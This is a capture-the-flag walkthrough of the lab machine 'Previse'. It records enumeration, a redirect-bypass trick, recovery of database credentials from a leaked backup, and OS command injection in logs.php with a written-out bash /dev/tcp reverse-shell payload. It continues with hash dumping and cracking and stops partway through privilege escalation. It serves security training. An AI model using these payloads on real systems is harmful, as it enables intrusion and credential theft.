# previse

## Information Gathering

## Enumeration

Start with basic nmap scan
```s
$ sudo nmap -p- -A -oN nmap/all.nmap 10.10.11.104     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-22 21:02 EDT
Nmap scan report for 10.10.11.104
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

### 22/tcp

Technologies:
- OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

### 80/tcp

Technologies:
- 

Running gobuster scan on root directory:
```s
$ gobuster dir -u "http://10.10.11.104" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,js -o gob/10.10.11.104-root.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,js
[+] Timeout:                 10s
===============================================================
2023/09/22 21:05:08 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]
/nav.php              (Status: 200) [Size: 1248]
/.php                 (Status: 403) [Size: 277]
/footer.php           (Status: 200) [Size: 217]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

`nav.php` does not require proper authorization to access. However, in order to interact with other pages, requires further authentication. 

Selecting any of the options gives a 302 redirect:

```
HTTP/1.1 302 Found
Date: Sat, 23 Sep 2023 01:15:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 4115
Connection: close
Content-Type: text/html; charset=UTF-8
```

Intercepting this request and changing the `302 Found` to `200 OK` gives access to the original page. Navigate to `accounts.php` and create an account.

This gives access to url `http://10.10.11.104/donwload.php?file=32`. Downloading the file `siteBackup.zip`. 


config.php
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

```


logs.php
```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>

```

Exploiting the OS command injection. Sending the following payload gets me a ping back

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0atht1ihcn5m48rau9c6h0ttt8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

delim=%3bping+10.10.14.25
```


## Foothold

The following payload gives a reverse shell

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0atht1ihcn5m48rau9c6h0ttt8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

delim=%3bbash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.25/1337+0>%261"
```

## Privilege Escalation

Running linpeas

Processes
```s
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root          1  0.0  0.4 159680  8876 ?        Ss   01:54   0:04 /sbin/init maybe-ubiquity
root        548  0.0  1.0 102924 21424 ?        S<s  01:54   0:00 /lib/systemd/systemd-journald
root        555  0.0  0.0 105912  1860 ?        Ss   01:54   0:00 /sbin/lvmetad -f
root        580  0.0  0.2  45628  4372 ?        Ss   01:54   0:01 /lib/systemd/systemd-udevd
systemd+    744  0.0  0.1 141788  3188 ?        Ssl  01:54   0:02 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        831  0.0  0.4  89872 10012 ?        Ss   01:54   0:00 /usr/bin/VGAuthService
root        835  0.1  0.3 225736  7344 ?        S<sl 01:54   0:38 /usr/bin/vmtoolsd
systemd+    967  0.0  0.2  71720  4984 ?        Ss   01:54   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+    993  0.0  0.2  70628  5060 ?        Ss   01:54   0:05 /lib/systemd/systemd-resolved
syslog     1125  0.0  0.2 263044  4896 ?        Ssl  01:54   0:00 /usr/sbin/rsyslogd -n
root       1126  0.0  0.1 457156  2076 ?        Ssl  01:54   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       1127  0.0  0.2  61884  5460 ?        Ss   01:54   0:00 /lib/systemd/systemd-logind
root       1128  0.0  0.1 110556  2092 ?        Ssl  01:54   0:02 /usr/sbin/irqbalance --foreground
daemon[0m     1144  0.0  0.1  28340  2296 ?        Ss   01:54   0:00 /usr/sbin/atd -f
message+   1145  0.0  0.2  50064  4576 ?        Ss   01:54   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       1208  0.0  0.1  30036  3200 ?        Ss   01:54   0:00 /usr/sbin/cron -f
root       1249  0.0  0.3 286392  6852 ?        Ssl  01:54   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       1301  0.0  0.8 169104 17328 ?        Ssl  01:54   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       1303  0.0  0.2  72308  5708 ?        Ss   01:54   0:00 /usr/sbin/sshd -D
root       1346  0.0  0.0  14896  1928 tty1     Ss+  01:54   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       1347  0.0  0.3 288888  6632 ?        Ssl  01:54   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1475  0.0  0.9 333796 18352 ?        Ss   01:54   0:01 /usr/sbin/apache2 -k start
www-data   1483  0.0  0.7 338556 14536 ?        S    01:54   0:00  _ /usr/sbin/apache2 -k start
www-data   1976  0.0  0.0   4636   860 ?        S    02:09   0:00  |   _ sh -c /usr/bin/python /opt/scripts/log_process.py ;bash -c "bash -i >& /dev/tcp/10.10.14.25/1337 0>&1"
www-data   1979  0.0  0.1  18384  3036 ?        S    02:09   0:00  |       _ bash -c bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
www-data   1980  0.0  0.1  18516  3420 ?        S    02:09   0:00  |           _ bash -i
www-data   2005  0.0  0.4  37436  9444 ?        S    02:10   0:00  |               _ python3 -c import pty;pty.spawn("/bin/bash")
www-data   2006  0.0  0.1  18516  3472 pts/0    Ss   02:10   0:00  |                   _ /bin/bash
www-data  20256  0.5  0.1   5532  2644 pts/0    S+   12:34   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  23241  0.0  0.0   5532  1100 pts/0    S+   12:34   0:00  |                       |   _ /bin/sh ./linpeas.sh
www-data  23245  0.0  0.1  37020  3368 pts/0    R+   12:34   0:00  |                       |   |   _ ps fauxwww
www-data  23244  0.0  0.0   5532  1100 pts/0    S+   12:34   0:00  |                       |   _ /bin/sh ./linpeas.sh
www-data  20257  0.0  0.0   4544   832 pts/0    S+   12:34   0:00  |                       _ tee linpeas-res.txt
www-data   2977  0.0  0.4 338196  9260 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data   2978  0.0  0.4 338196  9260 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data   2979  0.0  0.4 338196  9260 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data   2980  0.0  0.4 338196  9260 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data   2981  0.0  0.4 338196  9260 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
mysql      1479  0.0  9.4 1491984 191016 ?      Sl   01:54   0:24 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

internal ports
```s
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

users and groups
```s
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
```

unexpected at root
```s
╔══════════╣ Unexpected in root
/vmlinuz.old
/initrd.img.old
/vmlinuz
/initrd.img
```

```s
╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/m4lwhere/.viminfo
/home/m4lwhere/.bash_histor
```

You can authenticate to the mysql server with `root:mySQL_p@ssw0rd!:)`. In the DB `previse` there is a table `accounts`:

```s
mysql> select * from accounts;
+----+------------+------------------------------------+---------------------+
| id | username   | password                           | created_at          |
+----+------------+------------------------------------+---------------------+
|  1 | m4lwhere   | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | 0zymandias | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2023-09-23 02:05:49 |
+----+------------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

```

Extracting the password and running jtr:


```s
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long m4lwhere-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)     
1g 0:00:01:06 DONE (2023-09-23 08:49) 0.01498g/s 111076p/s 111076c/s 111076C/s ilovecolynn..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Authenticated as m4lwhere:
```s
$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```